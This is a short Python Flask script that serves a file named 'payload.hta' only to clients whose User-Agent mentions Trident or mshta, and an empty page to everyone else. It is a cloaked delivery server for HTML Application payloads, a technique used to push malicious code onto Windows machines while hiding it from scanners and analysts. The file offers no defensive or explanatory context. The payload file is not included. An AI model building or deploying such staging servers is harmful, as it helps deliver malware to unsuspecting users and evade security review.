import os
from flask import Flask, request

app = Flask(__name__)
PORT = int(os.environ.get("PORT", 8000))

@app.route('/')
def handle_request():
    user_agent = request.headers.get('User-Agent', '')
    if "Trident" in user_agent or "mshta" in user_agent.lower():
        with open("payload.hta", "r") as f:
            return f.read()
    else:
        return "<html><head></head><body></body></html>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
